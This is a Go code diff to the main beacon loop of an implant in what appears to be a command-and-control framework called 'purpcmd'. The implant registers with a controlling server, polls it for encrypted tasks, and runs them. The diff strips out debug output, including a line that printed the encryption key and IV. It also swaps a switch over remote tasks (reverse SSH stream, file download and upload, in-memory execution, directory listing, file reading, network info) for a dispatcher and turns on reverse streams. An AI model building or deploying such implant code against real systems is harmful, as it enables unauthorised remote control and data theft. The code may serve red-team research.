@@ -3,12 +3,9 @@ package core
 import (
 	"bytes"
 	"encoding/base64"
-	"fmt"
 	"io"
 	"time"
 
-	"purpcmd/implant/ssh"
-	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
 )
 
@@ -37,10 +34,7 @@ func Start(sock string, payloadTypes ...string) {
 		return
 	}
 
-	fmt.Println("key", base64.StdEncoding.EncodeToString(key[:]), "iv", base64.StdEncoding.EncodeToString(iv[:]))
-
 	p := base64.StdEncoding.EncodeToString(aux)
-	println(p)
 	if err := h.PostRegistering([]byte(p)); err != nil {
 		println(err.Error())
 		return
@@ -53,7 +47,6 @@ func Start(sock string, payloadTypes ...string) {
 		enc.HMACPackAddHmac(&dataEnc)
 		dataP := base64.StdEncoding.EncodeToString(dataEnc)
 
-		println("sent check:", dataP)
 		resp, err := h.Get([]byte(dataP))
 		if err != nil {
 			println(err.Error())
@@ -68,7 +61,6 @@ func Start(sock string, payloadTypes ...string) {
 			time.Sleep(time.Duration(i.Sleep) * time.Second)
 			continue
 		}
-		fmt.Println("Data received ", len(xyz))
 		if len(xyz) < 16 {
 			time.Sleep(time.Duration(i.Sleep) * time.Second)
 			continue
@@ -77,7 +69,7 @@ func Start(sock string, payloadTypes ...string) {
 		n, _ := base64.StdEncoding.Decode(dataB64, xyz)
 
 		if !enc.HMACVerifyHash(dataB64[:n]) {
-			fmt.Println("data not verified properly")
+			println("data not verified properly")
 			return
 		}
 		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
@@ -87,51 +79,32 @@ func Start(sock string, payloadTypes ...string) {
 			return
 		}
 
-		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))
+		tid, tcode, payload, err := PackParseTaskChecked(bytes.NewReader(xyzDecry))
+		if err != nil {
+			println("invalid task frame:", err.Error())
+			time.Sleep(time.Duration(i.Sleep) * time.Second)
+			continue
+		}
 
 		// Create command context for handlers
 		ctx := &CommandContext{
-			Implant: i,
-			Encrypt: &enc,
-			HTTP:    h,
+			Implant:             i,
+			Encrypt:             &enc,
+			HTTP:                h,
+			AllowReverseStreams: true,
 		}
 
-		print("->", tcode)
-		switch tcode {
-		case internal.PING:
-			response := HandlePing(ctx, payload, tid)
-			h.Post([]byte(response))
-		case internal.SSH:
-			print("->", tcode, "calling ssh for ", h.Socket)
-			ssh.Wsclient("aaa", "/any.png?stream="+string(payload), h.Socket)
-		case internal.DOWN:
-			response := HandleDownload(ctx, payload, tid)
-			h.Post([]byte(response))
-		case internal.UPL:
-			response := HandleUpload(ctx, payload, tid)
-			h.Post([]byte(response))
-		case internal.KILL:
+		response, terminate, executeErr := ExecuteTask(ctx, tcode, payload, tid)
+		if response != "" {
+			if postErr := h.Post([]byte(response)); postErr != nil {
+				println(postErr.Error())
+			}
+		}
+		if executeErr != nil {
+			println(executeErr.Error())
+		}
+		if terminate {
 			HandleKill()
-		case internal.CD:
-			response := HandleCD(ctx, payload, tid)
-			h.Post([]byte(response))
-		case internal.PWD:
-			response := HandlePWD(ctx, tid)
-			h.Post([]byte(response))
-		case internal.LS:
-			response := HandleLS(ctx, payload, tid)
-			h.Post([]byte(response))
-		case internal.MEMEXEC:
-			response := HandleMEMEXEC(ctx, payload, tid)
-			h.Post([]byte(response))
-		case internal.IFCONFIG:
-			response := HandleIFCONFIG(ctx, tid)
-			h.Post([]byte(response))
-		case internal.CAT:
-			response := HandleCAT(ctx, payload, tid)
-			h.Post([]byte(response))
-		default:
-			print("->", tcode, "Nothing")
 		}
 
 		time.Sleep(time.Duration(i.Sleep) * time.Second)
